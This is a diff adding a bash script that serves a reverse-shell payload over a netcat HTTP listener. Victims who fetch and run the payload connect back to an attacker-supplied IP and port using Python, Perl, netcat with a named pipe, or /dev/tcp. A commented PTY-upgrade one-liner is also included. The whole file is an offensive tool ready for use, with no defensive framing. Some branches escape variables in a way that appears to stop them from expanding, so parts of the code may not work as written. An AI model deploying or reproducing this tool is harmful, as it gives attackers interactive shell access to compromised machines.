@@ -1,0 +1,45 @@
+#!/usr/bin/env bash
+
+#PTY_UPGRADE_CMD = "p=$(which python || which python3); s=$(which bash || which sh); if [ -n $p ]; then exec $p -c 'import pty;pty.spawn(\"'$s'\")'; fi"
+
+# Reverse shell
+RIP=$1
+RPORT=$2
+
+# Listening port
+LPORT=$3
+
+# Common reverse shell technique
+REVERSE_SHELL=$(cat <<EOF
+#!/bin/bash
+
+if command -v python > /dev/null 2>&1 || command -v python3 > /dev/null 2>&1; then
+    python_cmd=\$(command -v python || command -v python3)
+    \$python_cmd -c "import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$RIP',$RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i']);"
+    exit
+fi
+
+if command -v perl > /dev/null 2>&1; then
+    perl -e "use Socket;\\\$i='$RIP';\\\$p=$RPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
+    exit
+fi
+
+if command -v nc > /dev/null 2>&1; then
+    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc \\\$RIP \\\$RPORT > /tmp/f
+    exit
+fi
+
+if command -v sh > /dev/null 2>&1; then
+    /bin/sh -i >& /dev/tcp/\\\$RIP/\\\$RPORT 0>&1
+    exit
+fi
+EOF
+)
+
+# Trap ctrl+c
+trap "echo 'Shutting down...'; exit" SIGINT
+
+# Start a loop to handle incoming connections
+while true; do
+    echo -e "HTTP/1.1 200 OK\r\nContent-Length: $(echo "$REVERSE_SHELL" | wc -c)\r\n\r\n$REVERSE_SHELL" | nc -l -p $LPORT
+done
